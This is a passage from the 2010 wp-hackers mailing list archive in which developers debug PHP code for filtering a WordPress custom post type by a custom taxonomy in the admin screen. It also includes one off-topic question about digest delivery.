> >>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>
> >>> function my_restrict_manage_posts() {
> >>> global $typenow;
> >>> if ($typenow=='ressource_fr')
> >>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>> }
> >>>
> >>> add_action( 'request', 'my_request' );
> >>> function my_request($request) {
> >>>      if (isset($request['post_type']) &&
> >>> $request['post_type']=='ressource_fr') {
> >>>              $request['taxonomy'] = 'classement_fr';
> >>>              $request['term'] =
> >>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>              unset($request['name']);
> >>>      }
> >>>      return $request;
> >>> }
> >>>
> >>> generated html :
> >>> <select id="classement_fr" name="classement_fr"> <option value="0">Show
> >> All
> >>> Classements FR</option> <option value="5">Langue oral</option> <option
> >> value
> >>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> >> value="8
> >>> ">Niveau 3</option> </select><input type="submit"
> id="post-query-submit"
> >>> value="Filtrer" class="button-secondary" />
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From frank at bueltge.de  Fri Jul 23 11:19:05 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 23 Jul 2010 13:19:05 +0200
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <B0E5841F-AB25-47BE-94D4-C815460BA672@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com> 
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com> 
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com> 
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com> 
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com> 
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com> 
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com> 
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com> 
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com> 
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com> 
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com> 
	<AANLkTinXfH2EO-Bv5KCZgH_6DuE-QKf9xwVSLCLOgTE5@mail.gmail.com> 
	<B0E5841F-AB25-47BE-94D4-C815460BA672@newclarity.net>
Message-ID: <AANLkTikQYH6s_+g8zn0y=bh-WxvHw7X2sEwor4v8GEXE@mail.gmail.com>

Thanks Mike, good sleep :)


On Fri, Jul 23, 2010 at 1:12 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> One problem, for sure, is line 131, should be:
>
> ?wp_dropdown_categories( 'show_option_all=' . __( 'View all authors', FB_CPT_TEXTDOMAIN ) . '&show_count=1&hierarchical=1&taxonomy=' .FB_CPT_TAXONOMY_TYPE_1 . '&name=' .FB_CPT_TAXONOMY_TYPE_1);
>
> If that doesn't solve it you may be on your own (or get someone else here to help) as I have to get some sleep eventually...
>
> On Jul 23, 2010, at 7:02 AM, Frank Bueltge wrote:
>
>> @mike: i hope is not to much source, is an example plugin to test
>> possibilies with custom post type
>> http://wordpress.pastebin.com/0u7DW03C
>>
>>
>>
>> On Fri, Jul 23, 2010 at 12:31 PM, Mike Schinkel
>> <mikeschinkel at newclarity.net> wrote:
>>> Frank,
>>>
>>> Please show me your ?register_post_type, request hook, restrict_manage_posts. Post the code at http://wordpress.pastebin.com/ or http://gist.github.com/ so it's indented and easier to read.
>>>
>>> -Mike
>>>
>>> On Jul 23, 2010, at 6:29 AM, Frank Bueltge wrote:
>>>
>>>> with fitler:
>>>> Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
>>>> quotes [posts_per_page] => 20 )
>>>>
>>>> default, without filter.
>>>> Array ( [order] => DESC [orderby] => date [post_type] => quotes
>>>> [posts_per_page] => 20 )
>>>>
>>>>
>>>>
>>>> On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
>>>> <mikeschinkel at newclarity.net> wrote:
>>>>> What do you get in the view source when you using this instead:
>>>>>
>>>>> function request($request) {
>>>>> ? ? ? ?print_r($request);
>>>>> ? ? ? ?exit;
>>>>> }
>>>>>
>>>>> Also, what's your URL after clicking the "Filter" button?
>>>>>
>>>>> -Mike
>>>>>
>>>>>
>>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>>>>>
>>>>>> now, when I click on filter button the result is always the same, all list
>>>>>> of ressources.
>>>>>>
>>>>>> my code :
>>>>>>
>>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>>>>>
>>>>>> function register_profperso_taxonomies() {
>>>>>>
>>>>>> register_taxonomy(
>>>>>> 'classement_fr',
>>>>>> array( 'ressource_fr' ),
>>>>>> array(
>>>>>> 'public' => true,
>>>>>> 'hierarchical' => true,
>>>>>> 'labels' => array(
>>>>>> 'name' => __( 'Classements FR' ),
>>>>>> 'singular_name' => __( 'Classement FR' )
>>>>>> ),
>>>>>> 'query_var' => 'classement-fr',
>>>>>> ? ? ? ?'rewrite' => array( 'slug' => 'cours-fr' ),
>>>>>> )
>>>>>> );
>>>>>> }
>>>>>>
>>>>>>
>>>>>> // pour filtrer les ressources par classement
>>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>>>>>
>>>>>> function my_restrict_manage_posts() {
>>>>>> global $typenow;
>>>>>> if ($typenow=='ressource_fr')
>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>>>>> }
>>>>>>
>>>>>> add_action( 'request', 'my_request' );
>>>>>> function my_request($request) {
>>>>>> ? ? ? if (isset($request['post_type']) &&
>>>>>> $request['post_type']=='ressource_fr') {
>>>>>> ? ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
>>>>>> ? ? ? ? ? ? ? $request['term'] =
>>>>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>>>> ? ? ? ? ? ? ? unset($request['name']);
>>>>>> ? ? ? }
>>>>>> ? ? ? return $request;
>>>>>> }
>>>>>>
>>>>>> generated html :
>>>>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show All
>>>>>> Classements FR</option> <option value="5">Langue oral</option> <option value
>>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
>>>>>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>>>>>> value="Filtrer" class="button-secondary" />
>>>>>> _______________________________________________
>>>>>> wp-hackers mailing list
>>>>>> wp-hackers at lists.automattic.com
>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul 23 11:24:32 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 07:24:32 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTi=m6ZK48sBBgGYGEtSBbGia3rHeaiJZVQzc9Ja4@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
	<BD16269A-6163- 4F9F-BFC8-CDA525E5908F@newclarity.net>
	<AANLkTi=m6ZK48sBBgGYGEtSBbGia3rHeaiJZVQzc9Ja4@mail.gmail.com>
Message-ID: <E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>

In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr" whereas line 64 uses "$request['classement-fr']" and they don't match.  Change line 56 to be "name=classement-fr".

-Mike

On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:

> Mike,
> classement_fr is the name of the taxonomy.
> classement-fr is the value of the query_var argument.
> 
> Jimmy
> 
> 
> 
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> 
>> Jimmy,
>> 
>> I just noticed, '[classement_fr] => 6' is not in your array.
>> 
>> First try to use either "classement_fr" everywhere or "classement-fr" and
>> see if that fixes it.
>> 
>> -Mike
>> 
>> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>> 
>>> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
>>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
>>> 
>>> url after clicking "filter" button :
>>> 
>>> 
>> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
>>> 
>>> 
>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>> 
>>>> What do you get in the view source when you using this instead:
>>>> 
>>>> function request($request) {
>>>>      print_r($request);
>>>>      exit;
>>>> }
>>>> 
>>>> Also, what's your URL after clicking the "Filter" button?
>>>> 
>>>> -Mike
>>>> 
>>>> 
>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>>>> 
>>>>> now, when I click on filter button the result is always the same, all
>>>> list
>>>>> of ressources.
>>>>> 
>>>>> my code :
>>>>> 
>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>>>> 
>>>>> function register_profperso_taxonomies() {
>>>>> 
>>>>> register_taxonomy(
>>>>> 'classement_fr',
>>>>> array( 'ressource_fr' ),
>>>>> array(
>>>>> 'public' => true,
>>>>> 'hierarchical' => true,
>>>>> 'labels' => array(
>>>>> 'name' => __( 'Classements FR' ),
>>>>> 'singular_name' => __( 'Classement FR' )
>>>>> ),
>>>>> 'query_var' => 'classement-fr',
>>>>>      'rewrite' => array( 'slug' => 'cours-fr' ),
>>>>> )
>>>>> );
>>>>> }
>>>>> 
>>>>> 
>>>>> // pour filtrer les ressources par classement
>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>>>> 
>>>>> function my_restrict_manage_posts() {
>>>>> global $typenow;
>>>>> if ($typenow=='ressource_fr')
>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>> 
>>>> 
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>>>> }
>>>>> 
>>>>> add_action( 'request', 'my_request' );
>>>>> function my_request($request) {
>>>>>     if (isset($request['post_type']) &&
>>>>> $request['post_type']=='ressource_fr') {
>>>>>             $request['taxonomy'] = 'classement_fr';
>>>>>             $request['term'] =
>>>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>>>             unset($request['name']);
>>>>>     }
>>>>>     return $request;
>>>>> }
>>>>> 
>>>>> generated html :
>>>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show
>>>> All
>>>>> Classements FR</option> <option value="5">Langue oral</option> <option
>>>> value
>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
>>>> value="8
>>>>> ">Niveau 3</option> </select><input type="submit"
>> id="post-query-submit"
>>>>> value="Filtrer" class="button-secondary" />
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jimmy.roy at gmail.com  Fri Jul 23 11:36:28 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 19:36:28 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
	<AANLkTi=m6ZK48sBBgGYGEtSBbGia3rHeaiJZVQzc9Ja4@mail.gmail.com>
	<E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
Message-ID: <AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com>

actually at first it was name-classement-fr, then I change to try.

the difference is :
name=classement_fr : chose a custom taxonomy andclick on filter return all
results in any case.
name=classement-fr : chose a custom taxonomy andclick on filter return no
result in any case.

Jimmy

2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>

> In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr" whereas
> line 64 uses "$request['classement-fr']" and they don't match.  Change line
> 56 to be "name=classement-fr".
>
> -Mike
>
> On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:
>
> > Mike,
> > classement_fr is the name of the taxonomy.
> > classement-fr is the value of the query_var argument.
> >
> > Jimmy
> >
> >
> >
> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >
> >> Jimmy,
> >>
> >> I just noticed, '[classement_fr] => 6' is not in your array.
> >>
> >> First try to use either "classement_fr" everywhere or "classement-fr"
> and
> >> see if that fixes it.
> >>
> >> -Mike
> >>
> >> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
> >>
> >>> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> >>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> >>>
> >>> url after clicking "filter" button :
> >>>
> >>>
> >>
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> >>>
> >>>
> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >>>
> >>>> What do you get in the view source when you using this instead:
> >>>>
> >>>> function request($request) {
> >>>>      print_r($request);
> >>>>      exit;
> >>>> }
> >>>>
> >>>> Also, what's your URL after clicking the "Filter" button?
> >>>>
> >>>> -Mike
> >>>>
> >>>>
> >>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>>>
> >>>>> now, when I click on filter button the result is always the same, all
> >>>> list
> >>>>> of ressources.
> >>>>>
> >>>>> my code :
> >>>>>
> >>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>>>
> >>>>> function register_profperso_taxonomies() {
> >>>>>
> >>>>> register_taxonomy(
> >>>>> 'classement_fr',
> >>>>> array( 'ressource_fr' ),
> >>>>> array(
> >>>>> 'public' => true,
> >>>>> 'hierarchical' => true,
> >>>>> 'labels' => array(
> >>>>> 'name' => __( 'Classements FR' ),
> >>>>> 'singular_name' => __( 'Classement FR' )
> >>>>> ),
> >>>>> 'query_var' => 'classement-fr',
> >>>>>      'rewrite' => array( 'slug' => 'cours-fr' ),
> >>>>> )
> >>>>> );
> >>>>> }
> >>>>>
> >>>>>
> >>>>> // pour filtrer les ressources par classement
> >>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>>>
> >>>>> function my_restrict_manage_posts() {
> >>>>> global $typenow;
> >>>>> if ($typenow=='ressource_fr')
> >>>>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>>>
> >>>>
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>>>> }
> >>>>>
> >>>>> add_action( 'request', 'my_request' );
> >>>>> function my_request($request) {
> >>>>>     if (isset($request['post_type']) &&
> >>>>> $request['post_type']=='ressource_fr') {
> >>>>>             $request['taxonomy'] = 'classement_fr';
> >>>>>             $request['term'] =
> >>>>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>>>             unset($request['name']);
> >>>>>     }
> >>>>>     return $request;
> >>>>> }
> >>>>>
> >>>>> generated html :
> >>>>> <select id="classement_fr" name="classement_fr"> <option
> value="0">Show
> >>>> All
> >>>>> Classements FR</option> <option value="5">Langue oral</option>
> <option
> >>>> value
> >>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> >>>> value="8
> >>>>> ">Niveau 3</option> </select><input type="submit"
> >> id="post-query-submit"
> >>>>> value="Filtrer" class="button-secondary" />
> >>>>> _______________________________________________
> >>>>> wp-hackers mailing list
> >>>>> wp-hackers at lists.automattic.com
> >>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jaredwilli at gmail.com  Fri Jul 23 11:40:42 2010
From: jaredwilli at gmail.com (Jared Williams)
Date: Fri, 23 Jul 2010 07:40:42 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 87
In-Reply-To: <mailman.11927.1279883588.1338.wp-hackers@lists.automattic.com>
References: <mailman.11927.1279883588.1338.wp-hackers@lists.automattic.com>
Message-ID: <AANLkTikq=enUh_+ejCjVFUB+ZaTvw3POS=aQUsRBgQRE@mail.gmail.com>

Sorry but this is irrelevant.

Is it possible to get this email list delivered as a once a day email, that
sends all of the emails of the day in one large message? I would like to be
subscribed to it but it blows up my inbox.
I tried to set it to daily digest or whatever that thing is, but doesn't
seem to do what I thought.

Thanks.

Jared

On Fri, Jul 23, 2010 at 7:13 AM, <wp-hackers-request at lists.automattic.com>wrote:

> Send wp-hackers mailing list submissions to
>        wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
>        http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
>        wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
>        wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
>   1. Re: Custom Post Type in Admin,    filter by new custom
>      Taxonomies (Mike Schinkel)
>   2. Re: Custom Post Type in Admin,    filter by new custom
>      Taxonomies (Jimmy Roy)
>   3. Re: Custom Post Type in Admin,    filter by new custom
>      Taxonomies (Frank Bueltge)
>   4. Re: Custom Post Type in Admin,    filter by new custom
>      Taxonomies (Mike Schinkel)
>   5. Re: Custom Post Type in Admin,    filter by new custom
>      Taxonomies (Mike Schinkel)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Fri, 23 Jul 2010 06:39:37 -0400
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] Custom Post Type in Admin,    filter by new
>        custom  Taxonomies
> To: wp-hackers at lists.automattic.com
> Message-ID: <7EC8DB89-7E18-4F2C-B94A-E1B78B29EA88 at newclarity.net>
> Content-Type: text/plain;       charset=us-ascii
>
> Jimmy,
>
> Please do the same I asked of Frank. Again, show me your
>  register_post_type, request hook, restrict_manage_posts. Post the code at
> http://wordpress.pastebin.com/ or http://gist.github.com/ so it's indented
> and easier to read.
>
> Also, are you using any other plugins that might be affecting the query
> vars?
>
> -Mike
>
> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>
> > Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> > ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> >
> > url after clicking "filter" button :
> >
> >
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> >
> >
> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >
> >> What do you get in the view source when you using this instead:
> >>
> >> function request($request) {
> >>       print_r($request);
> >>       exit;
> >> }
> >>
> >> Also, what's your URL after clicking the "Filter" button?
> >>
> >> -Mike
> >>
> >>
> >> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>
> >>> now, when I click on filter button the result is always the same, all
> >> list
> >>> of ressources.
> >>>
> >>> my code :
> >>>
> >>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>
> >>> function register_profperso_taxonomies() {
> >>>
> >>> register_taxonomy(
> >>> 'classement_fr',
> >>> array( 'ressource_fr' ),
> >>> array(
> >>> 'public' => true,
> >>> 'hierarchical' => true,
> >>> 'labels' => array(
> >>> 'name' => __( 'Classements FR' ),
> >>> 'singular_name' => __( 'Classement FR' )
> >>> ),
> >>> 'query_var' => 'classement-fr',
> >>>       'rewrite' => array( 'slug' => 'cours-fr' ),
> >>> )
> >>> );
> >>> }
> >>>
> >>>
> >>> // pour filtrer les ressources par classement
> >>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>
> >>> function my_restrict_manage_posts() {
> >>> global $typenow;
> >>> if ($typenow=='ressource_fr')
> >>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>> }
> >>>
> >>> add_action( 'request', 'my_request' );
> >>> function my_request($request) {
> >>>      if (isset($request['post_type']) &&
> >>> $request['post_type']=='ressource_fr') {
> >>>              $request['taxonomy'] = 'classement_fr';
> >>>              $request['term'] =
> >>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>              unset($request['name']);
> >>>      }
> >>>      return $request;
> >>> }
> >>>
> >>> generated html :
> >>> <select id="classement_fr" name="classement_fr"> <option value="0">Show
> >> All
> >>> Classements FR</option> <option value="5">Langue oral</option> <option
> >> value
> >>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> >> value="8
> >>> ">Niveau 3</option> </select><input type="submit"
> id="post-query-submit"
> >>> value="Filtrer" class="button-secondary" />
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
> ------------------------------
>
> Message: 2
> Date: Fri, 23 Jul 2010 18:46:40 +0800
> From: Jimmy Roy <jimmy.roy at gmail.com>
> Subject: Re: [wp-hackers] Custom Post Type in Admin,    filter by new
>        custom  Taxonomies
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTikDq2vEg342XC0jyQcYvP21trthAnDMTJcMGnbq at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> ok, I will post the code there.
> I don't use any plugin.
>
> Jimmy
>
>
>
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>
> > Jimmy,
> >
> > Please do the same I asked of Frank. Again, show me your
> >  register_post_type, request hook, restrict_manage_posts. Post the code
> at
> > http://wordpress.pastebin.com/ or http://gist.github.com/ so it's
> indented
> > and easier to read.
> >
> > Also, are you using any other plugins that might be affecting the query
> > vars?
> >
> > -Mike
> >
> > On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
> >
> > > Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> > > ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> > >
> > > url after clicking "filter" button :
> > >
> > >
> >
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> > >
> > >
> > > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> > >
> > >> What do you get in the view source when you using this instead:
> > >>
> > >> function request($request) {
> > >>       print_r($request);
> > >>       exit;
> > >> }
> > >>
> > >> Also, what's your URL after clicking the "Filter" button?
> > >>
> > >> -Mike
> > >>
> > >>
> > >> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> > >>
> > >>> now, when I click on filter button the result is always the same, all
> > >> list
> > >>> of ressources.
> > >>>
> > >>> my code :
> > >>>
> > >>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> > >>>
> > >>> function register_profperso_taxonomies() {
> > >>>
> > >>> register_taxonomy(
